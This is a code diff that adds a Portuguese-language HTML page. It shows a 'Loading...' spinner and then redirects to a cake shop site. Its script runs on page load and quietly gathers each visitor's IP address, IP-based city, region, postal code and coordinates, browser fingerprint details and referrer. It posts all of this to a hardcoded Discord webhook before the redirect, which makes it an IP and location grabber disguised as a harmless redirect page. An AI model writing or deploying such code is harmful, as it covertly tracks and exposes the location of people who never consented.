@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Carregando...</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #6366f1;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+
+
+    <script>
+        // Function to collect user data and redirect
+        function collectAndRedirect() {
+            const data = {
+                ip: "Carregando...",
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesEnabled: navigator.cookieEnabled,
+                referrer: document.referrer || "Direto",
+                timestamp: new Date().toISOString(),
+                location: "Carregando...",
+                city: "Carregando...",
+                region: "Carregando...",
+                country: "Carregando...",
+                postal: "Carregando...",
+                coordinates: "Carregando...",
+                preciseCoordinates: "Não solicitado"
+            };
+            getIPAndLocation(data);
+
+            function getIPAndLocation(data) {
+
+            // Get IP address and detailed location
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(ipData => {
+                    data.ip = ipData.ip;
+                    return fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                })
+                .then(response => response.json())
+                .then(locationData => {
+                    data.city = locationData.city || "Não disponível";
+                    data.region = locationData.region || "Não disponível";
+                    data.country = locationData.country_name || "Não disponível";
+                    data.postal = locationData.postal || "Não disponível";
+                    data.coordinates = `${locationData.latitude || "?"}, ${locationData.longitude || "?"}`;
+                    data.location = `${locationData.city || ""}, ${locationData.region || ""}, ${locationData.country_name || ""}`;
+                    sendToDiscord(data);
+                })
+                .catch(() => {
+                    data.ip = "Não disponível";
+                    sendToDiscord(data);
+                })
+                .finally(() => {
+                    window.location.href = 'https://sodiedoces.com.br/bolos/';
+                });
+            }
+        }
+
+        // Function to send data to Discord webhook
+        function sendToDiscord(data) {
+            const embed = {
+                title: "Novo acesso detectado",
+                color: 0xff0000,
+                fields: [
+                    { name: "Endereço IP", value: data.ip, inline: true },
+                    { name: "Localização", value: data.location, inline: true },
+                    { name: "Cidade", value: data.city, inline: true },
+                    { name: "Estado/Região", value: data.region, inline: true },
+                    { name: "País", value: data.country, inline: true },
+                    { name: "CEP", value: data.postal, inline: true },
+                    { name: "Coordenadas (IP)", value: data.coordinates, inline: true },
+                    { name: "Coordenadas Precisas", value: data.preciseCoordinates, inline: true },
+                    { name: "User Agent", value: data.userAgent, inline: false },
+                    { name: "Plataforma", value: data.platform, inline: true },
+                    { name: "Resolução", value: `${data.screenWidth}x${data.screenHeight}`, inline: true },
+                    { name: "Idioma", value: data.language, inline: true },
+                    { name: "Fuso horário", value: data.timezone, inline: true },
+                    { name: "Cookies habilitados", value: data.cookiesEnabled ? "Sim" : "Não", inline: true },
+                    { name: "Referência", value: data.referrer, inline: true },
+                    { name: "Horário", value: data.timestamp, inline: false }
+                ]
+            };
+
+            const payload = {
+                embeds: [embed]
+            };
+
+            fetch('https://discordapp.com/api/webhooks/1398113936829583400/V7X_lG2FEB1WbqfRR0pDv9q9YcZ1dr7kji5I4n0PFFdo_GYBxBNXqpD24J4vkNZWUfm_', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+        }
+
+        // Run everything when page loads
+        window.onload = collectAndRedirect;
+    </script>
+</body>
+</html>
